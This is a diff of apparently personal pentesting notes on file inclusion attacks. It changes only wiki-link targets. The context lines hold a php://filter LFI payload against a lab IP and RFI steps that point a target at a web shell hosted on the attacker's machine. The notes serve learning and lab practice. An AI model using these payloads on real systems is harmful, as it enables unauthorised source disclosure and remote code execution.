@@ -38,7 +38,7 @@ These return the Base64 of the site, see [[Base64]] to decode.
 - `http://10.10.10.80/?op=php://filter/convert.base64-encode/resource=index`
 ### Unzip File
 
-[[Web Shells#ZIP Wrapper LFI]]
+[[Web#ZIP Wrapper LFI]]
 ## LFI Bypass Filtering
 
 See [[Web Application Firewall (WAF)]]
@@ -86,7 +86,7 @@ To exploit RFI, an attacker needs to find a vulnerable parameter in the applicat
 
 1. Replace the parameter with the remote IP of your machine, e.g. `/blog/?lang=\\10.10.14.29\\test`
 2. Host a Python webserver
-3. Point the website at a [[Web Shells|Web Shell]] 
+3. Point the website at a [[Web|Web Shell]] 
 
 ## Guide
 
